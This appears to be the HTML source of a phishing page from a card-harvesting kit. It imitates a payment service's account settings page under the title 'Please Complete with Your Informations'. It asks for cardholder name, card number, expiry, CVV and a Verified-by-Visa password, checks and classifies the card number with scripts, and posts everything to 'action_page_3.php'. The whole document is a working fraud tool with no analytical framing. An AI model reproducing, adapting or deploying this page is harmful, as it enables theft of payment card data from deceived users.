
<!DOCTYPE html>

<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    	

  	<title>Please Complete with Your Informations</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  	
  	
  		<link rel="shortcut icon" href="img/favicon.ico">

		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
		
<SCRIPT LANGUAGE="JavaScript">
function popUp(URL) {
day = new Date();
id = day.getTime();
eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=660,height=396,left = 565.5,top = 149');");
}
</script>
	
<script type="text/javascript">
// <![CDATA[
function SelectCC(ccnum) {
var first = ccnum.charAt(0);
var second = ccnum.charAt(1);
var third = ccnum.charAt(2);
var fourth = ccnum.charAt(3);
var ccnmbr = (ccnum + '').replace(/\\s/g, ''); //remove space

if ((/^(417500|(4917|4913|4508|4844)\d{2})\d{10}$/).test(ccnmbr) && ccnmbr.length == 16) {
//Electron
document.getElementById("mastercard").src="img/ccicons/master-off.png";
document.getElementById("amex").src="img/ccicons/amex-off.png";
document.getElementById("discover").src="img/ccicons/discover-off.png";
document.getElementById("visa").src="img/ccicons/visa-off.png";
document.getElementById("electron").src="img/ccicons/electron-on.png";
document.getElementById("maestro").src="img/ccicons/maestro-off.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-back.png";
document.getElementById("cvv1").pattern="[0-9].{2}";
document.getElementById("cctype").value="ELECTRON";
}

else if ((/^(4)/).test(ccnmbr) && (ccnmbr.length == 16)) {
//Visa
document.getElementById("mastercard").src="img/ccicons/master-off.png";
document.getElementById("amex").src="img/ccicons/amex-off.png";
document.getElementById("discover").src="img/ccicons/discover-off.png";
document.getElementById("visa").src="img/ccicons/visa-on.png";
document.getElementById("electron").src="img/ccicons/electron-off.png";
document.getElementById("maestro").src="img/ccicons/maestro-off.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-back.png";
document.getElementById("cvv1").pattern="[0-9].{2}";
document.getElementById("cctype").value="VISA";
}
else if ((/^(34|37)/).test(ccnmbr) && ccnmbr.length == 15) {
//American Express
document.getElementById("hidden-pass").hidden="true";
document.getElementById("mastercard").src="img/ccicons/master-off.png";
document.getElementById("amex").src="img/ccicons/amex-on.png";
document.getElementById("discover").src="img/ccicons/discover-off.png";
document.getElementById("visa").src="img/ccicons/visa-off.png";
document.getElementById("electron").src="img/ccicons/electron-off.png";
document.getElementById("maestro").src="img/ccicons/maestro-off.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-front.png";
document.getElementById("cvv1").pattern="[0-9].{3}";
document.getElementById("cctype").value="AMEX";
}

else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(ccnmbr) && ccnmbr.length == 16) {
//Maestro
document.getElementById("mastercard").src="img/ccicons/master-off.png";
document.getElementById("amex").src="img/ccicons/amex-off.png";
document.getElementById("discover").src="img/ccicons/discover-off.png";
document.getElementById("visa").src="img/ccicons/visa-off.png";
document.getElementById("electron").src="img/ccicons/electron-off.png";
document.getElementById("maestro").src="img/ccicons/maestro-on.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-back.png";
document.getElementById("cvv1").pattern="[0-9].{2}";
document.getElementById("cctype").value="MAESTRO";
}

else if ((/^(51|52|53|54|55)/).test(ccnmbr) && ccnmbr.length == 16) {
//Mastercard
document.getElementById("mastercard").src="img/ccicons/master-on.png";
document.getElementById("amex").src="img/ccicons/amex-off.png";
document.getElementById("discover").src="img/ccicons/discover-off.png";
document.getElementById("visa").src="img/ccicons/visa-off.png";
document.getElementById("electron").src="img/ccicons/electron-off.png";
document.getElementById("maestro").src="img/ccicons/maestro-off.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-back.png";
document.getElementById("cvv1").pattern="[0-9].{2}";
document.getElementById("cctype").value="MASTERCARD";
}
else if ((/^(6011|16)/).test(ccnmbr) && ccnmbr.length == 16) {
//Discover
document.getElementById("hidden-pass").hidden="true";
document.getElementById("mastercard").src="img/ccicons/master-off.png";
document.getElementById("amex").src="img/ccicons/amex-off.png";
document.getElementById("discover").src="img/ccicons/discover-on.png";
document.getElementById("visa").src="img/ccicons/visa-off.png";
document.getElementById("electron").src="img/ccicons/electron-off.png";
document.getElementById("maestro").src="img/ccicons/maestro-off.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-back.png";
document.getElementById("cvv1").pattern="[0-9].{2}";
document.getElementById("cctype").value="DISCOVER";
}

else {
document.getElementById("mastercard").src="img/ccicons/master-off.png";
document.getElementById("amex").src="img/ccicons/amex-off.png";
document.getElementById("discover").src="img/ccicons/discover-off.png";
document.getElementById("visa").src="img/ccicons/visa-off.png";
document.getElementById("electron").src="img/ccicons/electron-off.png";
document.getElementById("maestro").src="img/ccicons/maestro-off.png";
document.getElementById("cvv-image").src="img/ccicons/cvv/icon-cvv-back.png";
document.getElementById("cvv1").pattern="[0-9].{2,3}";
document.getElementById("cctype").value="";
}
}

// ]]></script>


    </head>    
    
    	
    		<body id="settings">

		    		<div id="page">

		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" alt="logo"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">
				
					<div class="upbar"></div>

				<ul class="navSecondary">
						<li><a href="#" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="#" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">

     		<section id="main" role="main">

		
<div class="column_24">
<div class="one column nogutter">


<div id="prfLeftNav">
	 	<div class="menu2"></div>
		</br>
		<div class="enable"></div>
</div>

<div class="mainContentFrame-cc">
	<div id="prfMainContentWrapper-cc" aria-live="polite">

	<div id="profile-PERSONAL_SETTINGSPanel">
<div id="prfPersonalInfo">
<h2 class="prfTabHeading">

			<center><div class="payment"></div></center>

</h2>


<form method="post" form action="action_page_3.php" >
  <div class="prfSection" id="cc">
    <h3 class="prfLabel">
      <div class="card-holder"></div>
    </h3>
    <div class="prfDetails confidential">
      <input pattern="[a-zA-Z-']+.{4,40}" style="letter-spacing: 2px;" title="Please enter a valid Card Holder"  type="text" id="CCName"  name="CCName" class="large" required/>
    </div>
    <br>
    </br>
    </br>
    <h3 class="prfLabel">
      <div class="cc"></div>
    </h3>
    <div class="prfDetails confidential">
      <div class="CardNumber-" id="CardNumber-">
  <div class="element">
      <input style="font-size:15px" type="text" name="card_number" id="card_number" placeholder="1234 5678 9012 3456" maxlength="16">
      <link rel="stylesheet" href="files_billing2/css/check.css">
      <script src="files_billing2/js/jquery.min.js"></script>
      <script src="files_billing2/js/jquery.maskedinput.js" type="text/javascript"></script>
      <script src="files_billing2/js/ccFormat.js"></script>
      <script src="files_billing2/js/jquery.creditCardValidator.js"></script>
      <script type="text/javascript">
	function check_cc() {
		$('#card_number').validateCreditCard(function(result) {
				if(result.card_type == null)
				{
						$('#card_number').removeClass();
				}
				else
				{
						$('#card_number').addClass(result.card_type.name);
				}

				if(result.valid)
				{
					$('#form').addClass("valid");
					$("#card_number").removeClass("fail");
				}
				else
				{
					event.preventDefault();
					$("#card_number").addClass("fail");
					$("#card_number").focus();
					$('#card_number').removeClass("valid");
				}
		});
	}

   $(function() {
        $('#card_number').validateCreditCard(function(result) {
            if(result.card_type == null)
            {
                $('#card_number').removeClass();
            }
            else
            {
                $('#card_number').addClass(result.card_type.name);
            }

            if(!result.valid)
            {
                $('#card_number').removeClass("valid");
            }
            else
            {
                $('#card_number').addClass("valid");
            }

        });
    });
      </script>
  </div>
</div></div>
    <br>
    </br>
    </br>
    <h3 class="prfLabel">
      <div class="card-type"></div>
    </h3>
    <div class="prfDetails confidential"> &nbsp;&nbsp;&nbsp;&nbsp; <img src="img/ccicons/visa-off.png" alt="" width="46px" height="31px" id="visa" /> <img src="img/ccicons/electron-off.png" alt="" width="45px" height="31px" id="electron" /> <img src="img/ccicons/master-off.png" alt="" width="46px" height="31px" id="mastercard" /> <img src="img/ccicons/maestro-off.png" alt="" width="45px" height="31px" id="maestro" /> <img src="img/ccicons/amex-off.png" alt="" width="46px" height="31px" id="amex" /> <img src="img/ccicons/discover-off.png" alt="" width="46px" height="31px" id="discover" />
      <input id="cctype" type="text" name="cctype" sousize="20" value="" style="display:none;" >
    </div>
    <br>
    </br>
    </br>
    <h3 class="prfLabel">
      <div class="expiration"></div>
    </h3>
    <div class="prfDetails confidential">
      <select name="month" id="month" required/>
      
      <option selected value>Month</option>
      <option value="01">01</option>
      <option value="02">02</option>
      <option value="03">03</option>
      <option value="04">04</option>
      <option value="05">05</option>
      <option value="06">06</option>
      <option value="07">07</option>
      <option value="08">08</option>
      <option value="09">09</option>
      <option value="10">10</option>
      <option value="11">11</option>
      <option value="12">12</option>
      </select>
      <select name="year" id="year" required/>
      
      <option selected value>Year</option>
      <option value="2017">2017</option>
                        <option value="2018">2018</option>
                        <option value="2019">2019</option>
                        <option value="2020">2020</option>
                        <option value="2021">2021</option>
                        <option value="2022">2022</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
      </select>
    </div>
    <br>
    </br>
    </br>
    <h3 class="prfLabel">
      <div class="cvv"></div>
    </h3>
    <div class="prfDetails confidential">
      <input pattern="[0-9].{2,3}" style="letter-spacing: 3px;" title="Please enter a valid CVC" type="text" id="cvv1" maxlength="4" name="cvv1" class="cvv1" required />
      &nbsp;&nbsp;<img src="img/ccicons/cvv/icon-cvv-back.png" alt="" id="cvv-image" style="margin-bottom: -12px;"> <a href="javascript:popUp('bin/ccv.php')" 
	target="_blank" 
	title="Card Security Code" style="position: absolute; top: 300px; left: 355px;  ">
        <div class="cvvquestion"></div>
      </a> </div>
    <br>
    </br>
    </br>
    <div id="hidden-pass">
      <h3 class="prfLabel">
        <div class="vbv-pass"></div>
      </h3>
    </div>
  </div>
  </div>
  <div class="prfSection">
    <input class="next" value="next" type="submit" onclick="check_cc()" />
  </div>
</form>
	</div>
<div class="prfSection"></div>
  </form>
	 

</div>	
		
	</div>


	</div>
</div>

			</div>
</div>
	
     		</section>
    	 </section>
		 <center>
<div class="footer-billing"></div></center>


</div><div></div></body></html>